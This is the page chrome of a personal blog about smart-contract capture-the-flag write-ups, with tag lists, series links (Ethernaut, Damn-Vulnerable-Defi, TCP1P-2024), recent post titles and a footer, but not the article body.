Archives</button></li></ul><div class="tab-content mt-3"><div class="tab-pane active" id=taxonomyCategories role=tabpanel aria-labelledby=taxonomyCategoriesTab tabindex=0><a href=/categories/blockchain/ class="btn btn-sm btn-secondary post-taxonomy ps-3 post-category me-2 mb-2" title=Blockchain>Blockchain</a></div><div class=tab-pane id=taxonomyTags role=tabpanel aria-labelledby=taxonomyTagsTab tabindex=0><a href=/tags/erc20/ class="btn btn-sm btn-secondary post-taxonomy ps-3 post-tag me-2 mb-2" title=ERC20>ERC20
</a><a href=/tags/access-control/ class="btn btn-sm btn-secondary post-taxonomy ps-3 post-tag me-2 mb-2" title="Access Control">Access Control
</a><a href=/tags/delegate-call/ class="btn btn-sm btn-secondary post-taxonomy ps-3 post-tag me-2 mb-2" title="Delegate Call">Delegate Call
</a><a href=/tags/msg.sender-vs-tx.origin/ class="btn btn-sm btn-secondary post-taxonomy ps-3 post-tag me-2 mb-2" title="Msg.sender vs Tx.origin">Msg.sender vs Tx.origin
</a><a href=/tags/storage-layout/ class="btn btn-sm btn-secondary post-taxonomy ps-3 post-tag me-2 mb-2" title="Storage Layout">Storage Layout
</a><a href=/tags/assembly/ class="btn btn-sm btn-secondary post-taxonomy ps-3 post-tag me-2 mb-2" title=Assembly>Assembly
</a><a href=/tags/calldata-manipulation/ class="btn btn-sm btn-secondary post-taxonomy ps-3 post-tag me-2 mb-2" title="Calldata Manipulation">Calldata Manipulation
</a><a href=/tags/control-flow-manipulation/ class="btn btn-sm btn-secondary post-taxonomy ps-3 post-tag me-2 mb-2" title="Control Flow Manipulation">Control Flow Manipulation
</a><a href=/tags/decentralized-exchange/ class="btn btn-sm btn-secondary post-taxonomy ps-3 post-tag me-2 mb-2" title="Decentralized Exchange">Decentralized Exchange
</a><a href=/tags/denial-of-service/ class="btn btn-sm btn-secondary post-taxonomy ps-3 post-tag me-2 mb-2" title="Denial of Service">Denial of Service
</a><a href=https://s4bot3ur.github.io/tags class="btn btn-sm btn-secondary post-taxonomy ps-3 post-tag me-2 mb-2" title=ALL>ALL
<span class="badge badge-sm text-secondary bg-white ms-1">23</span></a></div><div class=tab-pane id=taxonomySeries role=tabpanel aria-labelledby=taxonomySeriesTab tabindex=0><a href=/series/ethernaut/ class="btn btn-sm btn-secondary post-taxonomy ps-3 post-series me-2 mb-2" title=Ethernaut>Ethernaut
</a><a href=/series/tcp1p-2024/ class="btn btn-sm btn-secondary post-taxonomy ps-3 post-series me-2 mb-2" title=TCP1P-2024>TCP1P-2024
</a><a href=/series/damn-vulnerable-defi/ class="btn btn-sm btn-secondary post-taxonomy ps-3 post-series me-2 mb-2" title=Damn-Vulnerable-Defi>Damn-Vulnerable-Defi</a></div><div class=tab-pane id=taxonomyArchives role=tabpanel aria-labelledby=taxonomyArchivesTab tabindex=0><a href class="btn btn-sm btn-secondary post-taxonomy ps-3 me-2 mb-2" title=2024>2024 <span class="badge badge-sm text-secondary bg-white ms-1">36</span></a></div></div></div></div></div><div class="accordion posts-toggle"><div class="row card component accordion-item"><div class="accordion-header card-header border-0"><a class="accordion-button d-lg-none mb-1 shadow-none p-0 bg-transparent" role=button data-bs-toggle=collapse href=#posts-toggle aria-expanded=true aria-controls=posts-toggle>Posts</a></div><div class="card-body collapse accordion-collapse accordion-body d-lg-block show" id=posts-toggle><ul class="nav nav-pills nav-fill" role=tablist><li class=nav-item role=presentation><button class="nav-link active" id=recent-posts-tab data-bs-toggle=tab data-bs-target=#recent-posts type=button role=tab aria-controls=recent-posts aria-selected=true>
Recent Posts</button></li></ul><div class="tab-content mt-3"><div class="tab-pane active" id=recent-posts role=tabpanel aria-labelledby=recent-posts-tab tabindex=0><ul class="post-list list-unstyled ms-1"><li class=mb-2><div class=d-flex><div class="flex-grow-1 d-flex flex-column h-auto justify-content-center"><a class=post-title href=/blogs/damn-vulnerable-defi/naivereceiver/>NaiveReceiver</a><div class="post-meta mt-2"><span class=post-date>October 27, 2024</span></div></div></div></li><li class=mb-2><div class=d-flex><div class="flex-grow-1 d-flex flex-column h-auto justify-content-center"><a class=post-title href=/blogs/tcp1p-2024/unsolvable-money-captcha/>Unsolvable Money Captcha</a><div class="post-meta mt-2"><span class=post-date>October 23, 2024</span></div></div></div></li><li class=mb-2><div class=d-flex><div class="flex-grow-1 d-flex flex-column h-auto justify-content-center"><a class=post-title href=/blogs/tcp1p-2024/minecraft-huh/>Minecraft Huh</a><div class="post-meta mt-2"><span class=post-date>October 23, 2024</span></div></div></div></li><li class=mb-2><div class=d-flex><div class="flex-grow-1 d-flex flex-column h-auto justify-content-center"><a class=post-title href=/blogs/tcp1p-2024/injus-gambit/>Inju's Gambit</a><div class="post-meta mt-2"><span class=post-date>October 23, 2024</span></div></div></div></li><li class=mb-2><div class=d-flex><div class="flex-grow-1 d-flex flex-column h-auto justify-content-center"><a class=post-title href=/blogs/tcp1p-2024/executive-problem/>Executive Problem</a><div class="post-meta mt-2"><span class=post-date>October 23, 2024</span></div></div></div></li></ul></div></div></div></div></div><div class="accordion post-toc d-none d-lg-block"><div class="accordion-item row mb-4 card component" id=postTOC><div class="card-header accordion-header"><h2 class="card-title fs-4 my-2 text-surface d-none d-lg-block">Contents</h2><a class="accordion-button d-lg-none mb-1 collapsed shadow-none p-0 bg-transparent" role=button data-bs-toggle=collapse href=#post-toc aria-expanded=false aria-controls=post-toc>Contents</a></div><div class="card-body collapse accordion-collapse accordion-body d-lg-block" id=post-toc><nav id=TableOfContents><ul><li><ul><li><a href=#key-concepts-to-learn>Key Concepts to Learn</a></li><li><a href=#exploit>Exploit</a></li></ul></li></ul></nav></div></div></div></div></aside></div></main><footer class="footer mt-auto py-3 text-center container"><div class="offcanvas offcanvas-bottom h-auto" tabindex=-1 id=offcanvasActionsPanel aria-labelledby=offcanvasActionsPanelLabel><div class=offcanvas-header><div class="offcanvas-title h5" id=offcanvasActionsPanelLabel><i class="fas fa-fw fa-th-large me-1"></i>
Actions</div><button type=button class="btn-close ms-auto" data-bs-dismiss=offcanvas data-bs-target=offcanvasActionsPanel aria-label=Close></button></div><div class="offcanvas-body mt-2"><div class="actions d-flex overflow-auto align-items-center"><a role=button class="action action-go-back d-flex flex-column align-items-center me-3" href="javascript: window.history.back();"><span class="action-icon mb-2"><i class="fas fa-2x fa-chevron-circle-down" data-fa-transform=rotate-90></i></span> Go back
</a><a role=button class="action action-reload-page d-flex flex-column align-items-center me-3"><span class="action-icon mb-2"><i class="fas fa-2x fa-redo-alt"></i></span> Reload
</a><a role=button class="action action-copy-url d-flex flex-column align-items-center me-3"><span class="action-icon mb-2"><i class="fas fa-2x fa-link"></i></span> Copy URL</a></div></div></div><div class="row text-center"><div class="col-12 mt-2"><p class=mb-2>S4b03ur's Website</p><p class="text-secondary mb-2"><small></small></p><div class="copyright mb-2 text-secondary"><small>Copyright © 2024-2024 s4bot3ur. All Rights Reserved.</small></div><nav class="social-links nav justify-content-center mb-2 mt-3"><a class="nav-link social-link p-0 me-1 mb-2" href=mailto:s4bot3ur.x.t0r4n4d0@gmail.com title=Email><i class="fas fa-fw fa-2x fa-envelope" style=color:#0963ac></i>
</a><a class="nav-link social-link p-0 me-1 mb-2" target=_blank href=https://github.com/s4bot3ur title=GitHub rel=me><i class="fa-fw fa-2x fab fa-github"></i>
</a><a class="nav-link social-link p-0 me-1 mb-2" target=_blank href=https://twitter.com/s4bot3ur title=Twitter rel=me><i class="fa-fw fa-2x fab fa-twitter" style=color:#1d9bf0></i>
</a><a class="nav-link social-link p-0 me-1 mb-2" target=_blank href=/index.xml title=RSS rel=me><i class="fas fa-fw fa-2x fa-rss" style=color:#ea6221></i></a></nav></div><div class="col-12 col-lg-8 offset-0 offset-lg-1"></div></div></footer><script data-precache src=/assets/main/bundle.min.95245e82378a431572e6896847c9d563c8a3453e085d8e2bcb937923efa12693.js integrity="sha256-lSRegjeKQxVy5oloR8nVY8ijRT4IXY4ry5N5I++hJpM=" crossorigin=anonymous async></script><script data-precache src=/assets/icons/bundle.min.f72634cee69eabf9716c1b6c273ad4157e7fade4f44c9cb1a86276f2f0aa5028.js integrity="sha256-9yY0zuaeq/lxbBtsJzrUFX5/reT0TJyxqGJ28vCqUCg=" crossorigin=anonymous defer></script><script data-precache src=/assets/viewer/bundle.min.06371891cfe6d10d36cba465c61c4d7cb17591a3be2fd9af4a38444d2074e709.js integrity="sha256-BjcYkc/m0Q02y6RlxhxNfLF1kaO+L9mvSjhETSB05wk=" crossorigin=anonymous defer></script><script src=https://giscus.app/client.js data-repo=s4bot3ur/Blockchain-Challenges data-repo-id=R_kgDOMw_Cqw data-category=General data-category-id=DIC_kwDOMw_Cq84Ci9GY data-mapping=title data-reactions-enabled=1 data-emit-metadata=1 data-input-position=top data-theme=preferred_color_scheme data-lang=en data-loading=lazy crossorigin=anonymous defer></script></body><script>document.addEventListener("DOMContentLoaded",()=>{document.querySelectorAll("pre").forEach(e=>{const t=document.createElement("button");t.innerText="Copy",t.classList.add("copy-button"),e.appendChild(t),t.addEventListener("click",()=>{const n=e.querySelector("code").innerText;navigator.clipboard.writeText(n).then(()=>{t.innerText="Copied!",setTimeout(()=>{t.innerText="Copy"},2e3)})})})})</script></html>